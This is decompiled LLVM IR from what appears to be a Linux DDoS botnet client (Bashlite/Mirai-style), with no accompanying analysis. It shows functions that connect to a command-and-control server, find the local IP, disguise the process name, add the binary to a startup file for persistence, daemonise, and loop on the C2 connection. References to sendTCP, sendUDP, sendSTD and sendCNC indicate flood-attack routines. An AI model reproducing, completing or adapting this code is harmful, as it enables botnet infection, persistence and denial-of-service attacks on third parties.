  %v3_11840 = inttoptr i32 %v2_11834 to i8*
  %v4_11840 = call i32 @__GI_strcoll(i8* %v3_11840, i32 ptrtoint ([10 x i8]* @global_var_1cb6c.780 to i32))
  %v2_11848 = icmp eq i32 %v4_11840, 0
  br i1 %v2_11848, label %dec_label_pc_11850, label %dec_label_pc_11858

dec_label_pc_11850:                               ; preds = %dec_label_pc_11830
  %v1_11854 = call i32 @__GI_exit(i32 0)
  br label %dec_label_pc_11858

dec_label_pc_11858:                               ; preds = %dec_label_pc_10cd4, %dec_label_pc_10c6c, %dec_label_pc_1127c, %dec_label_pc_11178, %dec_label_pc_114b8, %dec_label_pc_11630, %dec_label_pc_11830, %dec_label_pc_112a0, %dec_label_pc_10cf8, %dec_label_pc_10884, %dec_label_pc_1125c, %dec_label_pc_11250, %dec_label_pc_11048, %dec_label_pc_1081c, %dec_label_pc_1154c, %dec_label_pc_113c4, %dec_label_pc_10e48, %dec_label_pc_10b04, %dec_label_pc_10998, %dec_label_pc_108bc, %dec_label_pc_107b4, %dec_label_pc_1077c, %dec_label_pc_11850
  %v24_1185c = phi i32 [ %v1_1128c, %dec_label_pc_1127c ], [ %v0_11178, %dec_label_pc_11178 ], [ %v0_114b8, %dec_label_pc_114b8 ], [ %v0_11630, %dec_label_pc_11630 ], [ %v4_11840, %dec_label_pc_11830 ], [ %v0_112a0, %dec_label_pc_112a0 ], [ %v0_10cf8, %dec_label_pc_10cf8 ], [ 0, %dec_label_pc_10884 ], [ %v1_1126c, %dec_label_pc_1125c ], [ 0, %dec_label_pc_11250 ], [ 0, %dec_label_pc_11048 ], [ 0, %dec_label_pc_1081c ], [ %v3_1155c, %dec_label_pc_1154c ], [ %v3_113d4, %dec_label_pc_113c4 ], [ %v3_10e58, %dec_label_pc_10e48 ], [ %v3_10b14, %dec_label_pc_10b04 ], [ %v3_109bc, %dec_label_pc_10998 ], [ %v0_10894, %dec_label_pc_108bc ], [ %v3_107d0, %dec_label_pc_107b4 ], [ %v3_1078c, %dec_label_pc_1077c ], [ %v1_11854, %dec_label_pc_11850 ], [ 0, %dec_label_pc_10c6c ], [ 0, %dec_label_pc_10cd4 ]
  store i32 %v3_10748, i32* @r4, align 4
  store i32 %v6_10748, i32* @r5, align 4
  store i32 %v9_10748, i32* @r6, align 4
  store i32 %v12_10748, i32* @r7, align 4
  store i32 %v15_10748, i32* @r8, align 4
  store i32 %v18_10748, i32* @fp, align 4
  ret i32 %v24_1185c

; uselistorder directives
  uselistorder i32 %v2_11820, { 1, 0 }
  uselistorder i32 %stack_var_-44.1, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v2_11614, { 1, 0 }
  uselistorder i32 %v1_115a0, { 1, 0 }
  uselistorder i32 %v1_11584, { 1, 0 }
  uselistorder i32 %v2_1156c, { 2, 1, 0, 3 }
  uselistorder i32 %v2_1149c, { 1, 0 }
  uselistorder i32 %v1_11418, { 1, 0 }
  uselistorder i32 %v1_113fc, { 1, 0 }
  uselistorder i32 %v2_113e4, { 2, 1, 0, 3 }
  uselistorder i32* %v1_1105c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_10fc8, { 1, 0 }
  uselistorder i32 %storemerge6, { 1, 0 }
  uselistorder i32 %storemerge7, { 1, 0 }
  uselistorder i32 %v1_10eb8, { 1, 0 }
  uselistorder i32 %v1_10e9c, { 1, 0 }
  uselistorder i32 %v1_10e80, { 1, 0 }
  uselistorder i32 %v2_10e68, { 2, 1, 0, 3 }
  uselistorder i32 %v2_10cdc, { 1, 0 }
  uselistorder i32 %storemerge8, { 1, 0 }
  uselistorder i32 %storemerge9, { 1, 0 }
  uselistorder i32 %storemerge10, { 1, 0 }
  uselistorder i32 %v1_10b74, { 1, 0 }
  uselistorder i32 %v1_10b58, { 1, 0 }
  uselistorder i32 %v1_10b3c, { 1, 0 }
  uselistorder i32 %v2_10b24, { 2, 1, 0, 3 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp, { 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 2, 3, 4, 5, 6, 24, 1, 25, 26, 27, 28, 0, 29, 30, 31, 34, 33, 32, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 (i32, i32, i32, i32)* @sendSTD, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32)* @sendCNC, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @sendTCP, { 1, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32, i32)* @sendUDP, { 1, 0 }
  uselistorder i32 ptrtoint (i32* @global_var_1c5cc.573 to i32), { 3, 12, 4, 13, 2, 14, 5, 15, 1, 16, 6, 17, 0, 18, 7, 19, 8, 20, 9, 21, 10, 22, 11, 23 }
  uselistorder i32 1000, { 3, 2, 1, 0 }
  uselistorder i32* @global_var_2cae8.734, { 0, 2, 1, 3 }
  uselistorder i32 ()* @getdtablesize, { 1, 0 }
  uselistorder i32 ptrtoint ([5 x i8]* @global_var_1b718.56 to i32), { 0, 2, 1 }
  uselistorder label %dec_label_pc_11858, { 22, 6, 5, 14, 4, 15, 7, 2, 10, 11, 3, 12, 16, 8, 0, 1, 17, 18, 19, 9, 13, 20, 21 }
  uselistorder label %dec_label_pc_11830, { 2, 1, 0 }
  uselistorder label %dec_label_pc_117a0, { 1, 0 }
  uselistorder label %dec_label_pc_11794, { 2, 0, 1 }
  uselistorder label %dec_label_pc_11710, { 1, 0 }
  uselistorder label %dec_label_pc_115e4, { 1, 0 }
  uselistorder label %dec_label_pc_1145c, { 1, 0 }
  uselistorder label %dec_label_pc_11358, { 1, 0 }
  uselistorder label %dec_label_pc_1109c, { 1, 0 }
  uselistorder label %dec_label_pc_11028, { 2, 0, 1, 3 }
  uselistorder label %dec_label_pc_10f7c, { 1, 0 }
  uselistorder label %dec_label_pc_10f3c, { 1, 0 }
  uselistorder label %dec_label_pc_10f04, { 1, 0 }
  uselistorder label %dec_label_pc_10e60, { 1, 0 }
  uselistorder label %dec_label_pc_10c88, { 1, 0 }
  uselistorder label %dec_label_pc_10c48, { 1, 0 }
  uselistorder label %dec_label_pc_10c10, { 1, 0 }
  uselistorder label %dec_label_pc_10bcc, { 1, 0 }
  uselistorder label %dec_label_pc_10b1c, { 1, 0 }
  uselistorder label %dec_label_pc_10860, { 1, 0 }
}

define i32 @initConnection() local_unnamed_addr {
entry:
  %stack_var_-4116 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_11864 = load i32, i32* @fp, align 4
  store i32 71788, i32* %stack_var_-4, align 4
  %v2_11868 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11868, i32* @fp, align 4
  %v2_1187c = ptrtoint i32* %stack_var_-4116 to i32
  store i32 4096, i32* @r2, align 4
  %v2_1188c = bitcast i32* %stack_var_-4116 to i8*
  %v3_1188c = call i32 @__GI_memset(i8* %v2_1188c, i32 0)
  %v2_11894 = load i32, i32* @global_var_26864.54, align 4
  %v2_11898 = icmp eq i32 %v2_11894, 0
  br i1 %v2_11898, label %dec_label_pc_118bc, label %dec_label_pc_118a0

dec_label_pc_118a0:                               ; preds = %entry
  %v1_118ac = call i32 @__libc_close(i32 %v2_11894)
  store i32 0, i32* @global_var_26864.54, align 4
  br label %dec_label_pc_118bc

dec_label_pc_118bc:                               ; preds = %entry, %dec_label_pc_118a0
  %v2_118c0 = load i32, i32* @global_var_26420.783, align 4
  %v2_118c4 = icmp eq i32 %v2_118c0, 0
  br i1 %v2_118c4, label %dec_label_pc_118f0, label %dec_label_pc_118dc

dec_label_pc_118dc:                               ; preds = %dec_label_pc_118bc
  %v1_118e4 = add i32 %v2_118c0, 1
  br label %dec_label_pc_118f0

dec_label_pc_118f0:                               ; preds = %dec_label_pc_118bc, %dec_label_pc_118dc
  %storemerge1 = phi i32 [ %v1_118e4, %dec_label_pc_118dc ], [ 0, %dec_label_pc_118bc ]
  store i32 %storemerge1, i32* @global_var_26420.783, align 4
  %v4_11908 = mul i32 %storemerge1, 4
  %v5_11908 = add i32 %v4_11908, ptrtoint ([16 x i8]** @global_var_2641c.785 to i32)
  %v6_11908 = inttoptr i32 %v5_11908 to i32*
  %v7_11908 = load i32, i32* %v6_11908, align 4
  %v2_11914 = inttoptr i32 %v7_11908 to i8*
  %v3_11914 = call i32 @strcpy(i32 %v2_1187c, i8* %v2_11914)
  %v2_11934 = call i32 @__GI_strchr(i32 %v2_1187c, i32 58)
  %v2_1193c = icmp eq i32 %v2_11934, 0
  br i1 %v2_1193c, label %dec_label_pc_1199c, label %dec_label_pc_11944

dec_label_pc_11944:                               ; preds = %dec_label_pc_118f0
  %v2_11958 = call i32 @__GI_strchr(i32 %v2_1187c, i32 58)
  %v1_11960 = add i32 %v2_11958, 1
  store i32 %v1_11960, i32* @r0, align 4
  %v1_11968 = call i32 @atol(i32 %v1_11960)
  %v2_11988 = call i32 @__GI_strchr(i32 %v2_1187c, i32 58)
  %v3_11998 = inttoptr i32 %v2_11988 to i8*
  store i8 0, i8* %v3_11998, align 1
  br label %dec_label_pc_1199c

dec_label_pc_1199c:                               ; preds = %dec_label_pc_118f0, %dec_label_pc_11944
  %stack_var_-20.0 = phi i32 [ 23, %dec_label_pc_118f0 ], [ %v1_11968, %dec_label_pc_11944 ]
  %v0_119a8 = call i32 @socket()
  store i32 %v0_119a8, i32* @global_var_26864.54, align 4
  %v4_119dc = call i32 @connectTimeout(i32 %v0_119a8, i32 %v2_1187c, i32 %stack_var_-20.0, i32 30)
  %v2_119e4 = icmp eq i32 %v4_119dc, 0
  %. = zext i1 %v2_119e4 to i32
  store i32 %v3_11864, i32* @fp, align 4
  ret i32 %.

; uselistorder directives
  uselistorder i32 %v2_1187c, { 2, 0, 1, 3, 4 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 23, { 1, 0, 2, 3, 4 }
  uselistorder i32 (i32)* @atol, { 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_1199c, { 1, 0 }
  uselistorder label %dec_label_pc_118f0, { 1, 0 }
  uselistorder label %dec_label_pc_118bc, { 1, 0 }
}

define i32 @getOurIP() local_unnamed_addr {
entry:
  %stack_var_-4182 = alloca i32, align 4
  %stack_var_-4200 = alloca i32, align 4
  %stack_var_-4168 = alloca i8, align 1
  %stack_var_-72 = alloca i32, align 4
  %stack_var_-68 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-4208 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_11a2c = load i32, i32* @fp, align 4
  store i32 %v3_11a2c, i32* %stack_var_-16, align 4
  %v0_11a48 = call i32 @socket()
  %v3_11a58 = icmp eq i32 %v0_11a48, -1
  br i1 %v3_11a58, label %dec_label_pc_11a60, label %dec_label_pc_11a70

dec_label_pc_11a60:                               ; preds = %entry
  br label %dec_label_pc_11cd8

dec_label_pc_11a70:                               ; preds = %entry
  store i32 2, i32* %stack_var_-52, align 4
  store i32 ptrtoint ([8 x i8]* @global_var_1cb78.787 to i32), i32* @r0, align 4
  %v2_11ab4 = call i32 @inet_addr(i32 ptrtoint ([8 x i8]* @global_var_1cb78.787 to i32))
  %v1_11ac4 = call i32 @htons(i32 53)
  %v3_11ae8 = bitcast i32* %stack_var_-52 to %sockaddr*
  %v4_11ae8 = call i32 @__libc_connect(i32 %v0_11a48, %sockaddr* %v3_11ae8, i32 16)
  %v3_11af8 = icmp eq i32 %v4_11ae8, -1
  br i1 %v3_11af8, label %dec_label_pc_11b00, label %dec_label_pc_11b10

dec_label_pc_11b00:                               ; preds = %dec_label_pc_11a70
  br label %dec_label_pc_11cd8

dec_label_pc_11b10:                               ; preds = %dec_label_pc_11a70
  store i32 16, i32* %stack_var_-72, align 4
  %v2_11b18 = ptrtoint i32* %stack_var_-68 to i32
  %v2_11b1c = ptrtoint i32* %stack_var_-72 to i32
  %v5_11b28 = bitcast i32* %stack_var_-68 to %sockaddr*
  %v6_11b28 = call i32 @__GI_getsockname(i32 %v0_11a48, %sockaddr* %v5_11b28, i32 %v2_11b1c, i32 %v2_11b18, i32 16)
  %v3_11b38 = icmp eq i32 %v6_11b28, -1
  br i1 %v3_11b38, label %dec_label_pc_11b40, label %dec_label_pc_11b50

dec_label_pc_11b40:                               ; preds = %dec_label_pc_11b10
  br label %dec_label_pc_11cd8

dec_label_pc_11b50:                               ; preds = %dec_label_pc_11b10
  store i32 ptrtoint (i32* @global_var_2cae0.485 to i32), i32* @r2, align 4
  %v4_11b64 = call i32 @__libc_open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @global_var_1cb80.790, i32 0, i32 0), i32 0)
  %v2_11bfc = ptrtoint i8* %stack_var_-4168 to i32
  br label %dec_label_pc_11bf4

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11bf4
  %v4_11b88 = call i32 @strstr(i32 %v2_11bfc, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @global_var_1cb90.792, i32 0, i32 0))
  %v2_11b90 = icmp eq i32 %v4_11b88, 0
  br i1 %v2_11b90, label %dec_label_pc_11bd8, label %dec_label_pc_11bb8.preheader

dec_label_pc_11bb8.preheader:                     ; preds = %dec_label_pc_11b74
  %v2_11bbc9 = load i8, i8* %stack_var_-4168, align 1
  %v7_11bc013 = icmp eq i8 %v2_11bbc9, 9
  br i1 %v7_11bc013, label %dec_label_pc_11bc8, label %dec_label_pc_11bac

dec_label_pc_11bac:                               ; preds = %dec_label_pc_11bb8.preheader, %dec_label_pc_11bac
  %v4_11bb814 = phi i32 [ %v1_11bb0, %dec_label_pc_11bac ], [ %v2_11bfc, %dec_label_pc_11bb8.preheader ]
  %v1_11bb0 = add i32 %v4_11bb814, 1
  %v5_11bb4 = inttoptr i32 %v1_11bb0 to i8*
  %v2_11bbc = load i8, i8* %v5_11bb4, align 1
  %v7_11bc0 = icmp eq i8 %v2_11bbc, 9
  br i1 %v7_11bc0, label %dec_label_pc_11bc8, label %dec_label_pc_11bac

dec_label_pc_11bc8:                               ; preds = %dec_label_pc_11bac, %dec_label_pc_11bb8.preheader
  %storemerge3.lcssa = phi i8* [ %stack_var_-4168, %dec_label_pc_11bb8.preheader ], [ %v5_11bb4, %dec_label_pc_11bac ]
  store i8 0, i8* %storemerge3.lcssa, align 1
  br label %dec_label_pc_11c1c

dec_label_pc_11bd8:                               ; preds = %dec_label_pc_11b74
  store i32 4096, i32* @r2, align 4
  %v3_11bf0 = call i32 @__GI_memset(i8* nonnull %stack_var_-4168, i32 0)
  br label %dec_label_pc_11bf4

dec_label_pc_11bf4:                               ; preds = %dec_label_pc_11b50, %dec_label_pc_11bd8
  %v4_11c0c = call i32 @fdgets(i32 %v2_11bfc, i32 4096, i32 %v4_11b64, i32 %v2_11bfc)
  %v2_11c14 = icmp eq i32 %v4_11c0c, 0
  br i1 %v2_11c14, label %dec_label_pc_11c1c, label %dec_label_pc_11b74

dec_label_pc_11c1c:                               ; preds = %dec_label_pc_11bf4, %dec_label_pc_11bc8
  %v1_11c20 = call i32 @__libc_close(i32 %v4_11b64)
  %v4_11c30 = load i8, i8* %stack_var_-4168, align 1
  %v2_11c34 = icmp eq i8 %v4_11c30, 0
  br i1 %v2_11c34, label %dec_label_pc_11ccc, label %dec_label_pc_11c3c

dec_label_pc_11c3c:                               ; preds = %dec_label_pc_11c1c
  %v2_11c44 = ptrtoint i32* %stack_var_-4200 to i32
  %v3_11c5c = call i32 @strcpy(i32 %v2_11c44, i8* nonnull %stack_var_-4168)
  %v3_11c7c = call i32 @ioctl(i32 %v0_11a48, i32 35111, i32 %v2_11c44)
  %v2_11c9c = ptrtoint i32* %stack_var_-4182 to i32
  br label %dec_label_pc_11c8c

dec_label_pc_11c8c:                               ; preds = %dec_label_pc_11c3c, %dec_label_pc_11c8c
  %storemerge47 = phi i32 [ 0, %dec_label_pc_11c3c ], [ %v1_11cb8, %dec_label_pc_11c8c ]
  %v2_11ca4 = add i32 %storemerge47, %v2_11c9c
  %v1_11ca8 = inttoptr i32 %v2_11ca4 to i8*
  %v2_11ca8 = load i8, i8* %v1_11ca8, align 1
  %v4_11cb0 = add i32 %storemerge47, ptrtoint (i32* @global_var_26874.794 to i32)
  %v5_11cb0 = inttoptr i32 %v4_11cb0 to i8*
  store i8 %v2_11ca8, i8* %v5_11cb0, align 1
  %v1_11cb8 = add nuw nsw i32 %storemerge47, 1
  %v7_11cc8 = icmp slt i32 %v1_11cb8, 6
  br i1 %v7_11cc8, label %dec_label_pc_11c8c, label %dec_label_pc_11ccc

dec_label_pc_11ccc:                               ; preds = %dec_label_pc_11c8c, %dec_label_pc_11c1c
  %v1_11cd0 = call i32 @__libc_close(i32 %v0_11a48)
  %v3_11cec.pre = load i32, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11cd8:                               ; preds = %dec_label_pc_11b40, %dec_label_pc_11b00, %dec_label_pc_11a60
  store i32 0, i32* %stack_var_-4208, align 4
  br label %dec_label_pc_11ce8

dec_label_pc_11ce8:                               ; preds = %dec_label_pc_11ccc, %dec_label_pc_11cd8
  %v3_11cec = phi i32 [ %v3_11cec.pre, %dec_label_pc_11ccc ], [ 0, %dec_label_pc_11cd8 ]
  %v2_11cf4 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_11cf4, i32* @fp, align 4
  ret i32 %v3_11cec

; uselistorder directives
  uselistorder i32 %storemerge47, { 2, 1, 0 }
  uselistorder i32 %v1_11bb0, { 1, 0 }
  uselistorder i32 %v2_11bfc, { 1, 3, 0, 2 }
  uselistorder i32 %v0_11a48, { 1, 0, 2, 3, 4 }
  uselistorder i32* %stack_var_-4208, { 1, 0 }
  uselistorder i32* %stack_var_-72, { 1, 0 }
  uselistorder i8* %stack_var_-4168, { 3, 5, 2, 0, 1, 4 }
  uselistorder i32 (i32)* @htons, { 12, 11, 10, 9, 8, 7, 6, 5, 1, 4, 3, 2, 0 }
  uselistorder i32 53, { 0, 2, 1 }
  uselistorder label %dec_label_pc_11ce8, { 1, 0 }
  uselistorder label %dec_label_pc_11c8c, { 1, 0 }
  uselistorder label %dec_label_pc_11bf4, { 1, 0 }
  uselistorder label %dec_label_pc_11bac, { 1, 0 }
}

define i32 @getBuild() local_unnamed_addr {
entry:
  ret i32 ptrtoint ([9 x i8]* @global_var_1cb9c.796 to i32)
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %stack_var_-5744 = alloca i32, align 4
  %stack_var_-112 = alloca i32, align 4
  %stack_var_-1648 = alloca i32, align 4
  %stack_var_-624 = alloca i32, align 4
  %stack_var_-368 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11d2c = load i32, i32* @r4, align 4
  store i32 %v3_11d2c, i32* %stack_var_-24, align 4
  store i32 73012, i32* %stack_var_-4, align 4
  %v19_11d2c = ptrtoint i32* %stack_var_-24 to i32
  %v2_11d30 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_11d30, i32* @fp, align 4
  %v1_11d74 = bitcast i8** %argv to i32*
  %v2_11d74 = load i32, i32* %v1_11d74, align 4
  store i32 %v2_11d74, i32* @r4, align 4
  %v2_11d8c = load i32, i32* %v1_11d74, align 4
  %v1_11d90 = inttoptr i32 %v2_11d8c to i8*
  %v3_11d94 = call i32 @strlen(i8* %v1_11d90)
  %v0_11d9c = load i32, i32* @r4, align 4
  store i32 ptrtoint (i32* @global_var_1cba8.798 to i32), i32* @r1, align 4
  %v3_11da8 = call i32 @strncpy(i32 %v0_11d9c, i32 ptrtoint (i32* @global_var_1cba8.798 to i32), i32 %v3_11d94)
  store i32 ptrtoint (i32* @global_var_1cba8.798 to i32), i32* %v1_11d74, align 4
  %v0_11de4 = call i32 @prctl()
  %v2_11dec = call i32 @__GI_time(i32* null)
  store i32 %v2_11dec, i32* @r4, align 4
  %v0_11df4 = call i32 @__libc_getpid()
  %v0_11dfc = load i32, i32* @r4, align 4
  %v2_11dfc = xor i32 %v0_11dfc, %v0_11df4
  %v1_11e04 = call i32 @srand(i32 %v2_11dfc)
  %v2_11e0c = call i32 @__GI_time(i32* null)
  store i32 %v2_11e0c, i32* @r4, align 4
  %v0_11e14 = call i32 @__libc_getpid()
  %v0_11e1c = load i32, i32* @r4, align 4
  %v2_11e1c = xor i32 %v0_11e1c, %v0_11e14
  %v1_11e24 = call i32 @init_rand(i32 %v2_11e1c)
  store i32 ptrtoint ([19 x i8]* @global_var_1cbac.800 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1cbc0.802 to i32), i32* @r1, align 4
  %v3_11e40 = call i32 @__GI_fopen(i32 ptrtoint ([19 x i8]* @global_var_1cbac.800 to i32), i32 ptrtoint ([2 x i8]* @global_var_1cbc0.802 to i32))
  %v2_11e50 = icmp eq i32 %v3_11e40, 0
  br i1 %v2_11e50, label %dec_label_pc_11e58, label %dec_label_pc_11e74

dec_label_pc_11e58:                               ; preds = %entry
  store i32 ptrtoint ([13 x i8]* @global_var_1cbc4.804 to i32), i32* @r0, align 4
  store i32 ptrtoint ([2 x i8]* @global_var_1cbc0.802 to i32), i32* @r1, align 4
  %v3_11e68 = call i32 @__GI_fopen(i32 ptrtoint ([13 x i8]* @global_var_1cbc4.804 to i32), i32 ptrtoint ([2 x i8]* @global_var_1cbc0.802 to i32))
  br label %dec_label_pc_11e74

dec_label_pc_11e74:                               ; preds = %entry, %dec_label_pc_11e58
  %stack_var_-88.0 = phi i32 [ %v3_11e68, %dec_label_pc_11e58 ], [ %v3_11e40, %entry ]
  %stack_var_-92.0 = phi i8* [ getelementptr inbounds ([13 x i8], [13 x i8]* @global_var_1cbc4.804, i32 0, i32 0), %dec_label_pc_11e58 ], [ getelementptr inbounds ([19 x i8], [19 x i8]* @global_var_1cbac.800, i32 0, i32 0), %entry ]
  %v2_11e78 = icmp eq i32 %stack_var_-88.0, 0
  br i1 %v2_11e78, label %dec_label_pc_12010, label %dec_label_pc_11e80

dec_label_pc_11e80:                               ; preds = %dec_label_pc_11e74
  %v2_11e90 = load i32, i32* %v1_11d74, align 4
  %v1_11e94 = inttoptr i32 %v2_11e90 to i8*
  %v3_11e98 = call i32 @strlen(i8* %v1_11e94)
  %v2_11eac = ptrtoint i32* %stack_var_-368 to i32
  %v2_11eb8 = call i32 @getcwd(i32 %v2_11eac, i32 256)
  store i32 ptrtoint (i32* @global_var_1cbd4.806 to i32), i32* @r1, align 4
  %v2_11ec8 = bitcast i32* %stack_var_-368 to i8*
  %v3_11ec8 = call i32 @__GI_strcoll(i8* %v2_11ec8, i32 ptrtoint (i32* @global_var_1cbd4.806 to i32))
  %v2_11ed0 = icmp eq i32 %v3_11ec8, 0
  br i1 %v2_11ed0, label %dec_label_pc_12008, label %dec_label_pc_11ee8

dec_label_pc_11edc:                               ; preds = %dec_label_pc_11ee8
  %v1_11ee0 = add i32 %stack_var_-84.0, -1
  br label %dec_label_pc_11ee8

dec_label_pc_11ee8:                               ; preds = %dec_label_pc_11e80, %dec_label_pc_11edc
  %stack_var_-84.0 = phi i32 [ %v1_11ee0, %dec_label_pc_11edc ], [ %v3_11e98, %dec_label_pc_11e80 ]
  %v2_11ef8 = load i32, i32* %v1_11d74, align 4
  %v2_11f00 = add i32 %v2_11ef8, %stack_var_-84.0
  %v1_11f04 = inttoptr i32 %v2_11f00 to i8*
  %v2_11f04 = load i8, i8* %v1_11f04, align 1
  %v7_11f08 = icmp eq i8 %v2_11f04, 47
  br i1 %v7_11f08, label %dec_label_pc_11f10, label %dec_label_pc_11edc

dec_label_pc_11f10:                               ; preds = %dec_label_pc_11ee8
  %v2_11f20 = load i32, i32* %v1_11d74, align 4
  %v2_11f28 = add i32 %v2_11f20, %stack_var_-84.0
  %v2_11f2c = ptrtoint i32* %stack_var_-624 to i32
  store i32 %v2_11f2c, i32* @r0, align 4
  %v7_11f40 = call i32 @sprintf(i32 %v2_11f2c, i32 ptrtoint ([8 x i8]* @global_var_1cbd8.808 to i32), i32 %v2_11eac, i32 %v2_11f28, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v1_11f9c = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_11f50 = ptrtoint i32* %stack_var_-1648 to i32
  %v2_11f7c = bitcast i32* %stack_var_-1648 to i8*
  br label %dec_label_pc_11f98.outer

dec_label_pc_11f48:                               ; preds = %dec_label_pc_11f98
  %v3_11f60 = call i32 @fgets(i32 %v2_11f50, i32 1024, i32 %stack_var_-88.0)
  %v3_11f7c = call i32 @__GI_strcasecmp(i8* %v2_11f7c, i32 %v2_11f2c)
  %v2_11f84 = icmp eq i32 %v3_11f7c, 0
  br i1 %v2_11f84, label %dec_label_pc_11f8c, label %dec_label_pc_11f98

dec_label_pc_11f8c:                               ; preds = %dec_label_pc_11f48
  %v1_11f90 = add i32 %stack_var_-80.0.ph, 1
  br label %dec_label_pc_11f98.outer

dec_label_pc_11f98.outer:                         ; preds = %dec_label_pc_11f8c, %dec_label_pc_11f10
  %stack_var_-80.0.ph = phi i32 [ %v1_11f90, %dec_label_pc_11f8c ], [ 0, %dec_label_pc_11f10 ]
  br label %dec_label_pc_11f98

dec_label_pc_11f98:                               ; preds = %dec_label_pc_11f98.outer, %dec_label_pc_11f48
  %v2_11f9c = call i32 @feof(i8* %v1_11f9c)
  %v2_11fa4 = icmp eq i32 %v2_11f9c, 0
  br i1 %v2_11fa4, label %dec_label_pc_11f48, label %dec_label_pc_11fac

dec_label_pc_11fac:                               ; preds = %dec_label_pc_11f98
  %v2_11fb0 = icmp eq i32 %stack_var_-80.0.ph, 0
  %v2_11fbc = call i32 @__GI_fclose(i8* %v1_11f9c)
  br i1 %v2_11fb0, label %dec_label_pc_11fb8, label %dec_label_pc_12010

dec_label_pc_11fb8:                               ; preds = %dec_label_pc_11fac
  %v4_11fc0 = ptrtoint i8* %stack_var_-92.0 to i32
  store i32 %v4_11fc0, i32* @r0, align 4
  store i32 ptrtoint (i32* @global_var_1cbe0.810 to i32), i32* @r1, align 4
  %v3_11fc8 = call i32 @__GI_fopen(i32 %v4_11fc0, i32 ptrtoint (i32* @global_var_1cbe0.810 to i32))
  %v2_11fd8 = icmp eq i32 %v3_11fc8, 0
  br i1 %v2_11fd8, label %dec_label_pc_12010, label %dec_label_pc_11fe0

dec_label_pc_11fe0:                               ; preds = %dec_label_pc_11fb8
  %v2_11fec = call i32 @__GI_fputs(i32 %v2_11f2c, i32 %v3_11fc8)
  %v1_11ff4 = inttoptr i32 %v3_11fc8 to i8*
  %v2_11ff4 = call i32 @__GI_fclose(i8* %v1_11ff4)
  br label %dec_label_pc_12010

dec_label_pc_12008:                               ; preds = %dec_label_pc_11e80
  %v1_1200c = inttoptr i32 %stack_var_-88.0 to i8*
  %v2_1200c = call i32 @__GI_fclose(i8* %v1_1200c)
  br label %dec_label_pc_12010

dec_label_pc_12010:                               ; preds = %dec_label_pc_11fac, %dec_label_pc_11fb8, %dec_label_pc_11e74, %dec_label_pc_11fe0, %dec_label_pc_12008
  %v0_12010 = call i32 @getOurIP()
  %v0_12014 = call i32 @__libc_fork()
  %v2_12024 = icmp eq i32 %v0_12014, 0
  br i1 %v2_12024, label %dec_label_pc_12054, label %dec_label_pc_12090

dec_label_pc_12054:                               ; preds = %dec_label_pc_12010
  %v0_12054 = call i32 @__libc_fork()
  %v2_12064 = icmp eq i32 %v0_12054, 0
  br i1 %v2_12064, label %dec_label_pc_12074.thread, label %dec_label_pc_12080

dec_label_pc_12074.thread:                        ; preds = %dec_label_pc_12054
  br label %dec_label_pc_1209c

dec_label_pc_12080:                               ; preds = %dec_label_pc_12054
  %v1_12070 = call i32 @__GI_exit(i32 0)
  %v2_12088 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1cbe4.812 to i32))
  br label %dec_label_pc_1209c

dec_label_pc_12090:                               ; preds = %dec_label_pc_12010
  %v2_1202c = ptrtoint i32* %stack_var_-112 to i32
  %v3_1203c = call i32 @__libc_waitpid(i32 %v0_12014, i32 %v2_1202c, i32 0)
  %v1_12044 = call i32 @__GI_exit(i32 0)
  %v2_12098 = call i32 @zprintf(i32 ptrtoint ([13 x i8]* @global_var_1cbe4.812 to i32))
  br label %dec_label_pc_1209c

dec_label_pc_1209c:                               ; preds = %dec_label_pc_12074.thread, %dec_label_pc_12080, %dec_label_pc_12090
  %v0_1209c = call i32 @__GI_setsid()
  %v0_120a4 = call i32 @chdir()
  %v2_120b0 = call i32 @__bsd_signal(i32 13, i32 1)
  %v2_12954 = ptrtoint i32* %stack_var_-5744 to i32
  %v4_12964 = bitcast i32* %stack_var_-5744 to i8*
  %v2_123fc = add i32 %v19_11d2c, -5720
  %v2_126bc = ptrtoint i32* %stack_var_-1648 to i32
  %v2_126cc = bitcast i32* %stack_var_-1648 to i8*
  %v1_12540 = or i32 %v2_12954, 1
  %v5_12544 = inttoptr i32 %v1_12540 to i8*
  %v2_12560 = or i32 %v2_12954, 2
  %v2_12820 = add i32 %v19_11d2c, -600
  br label %dec_label_pc_120b8.outer

dec_label_pc_120b8.outer:                         ; preds = %dec_label_pc_12498, %dec_label_pc_12944, %dec_label_pc_1209c
  %stack_var_-96.0.ph19 = phi i32 [ 0, %dec_label_pc_1209c ], [ %stack_var_-96.2.ph, %dec_label_pc_12944 ], [ %v1_1249c, %dec_label_pc_12498 ]
  %v0_120b824 = call i32 @initConnection()
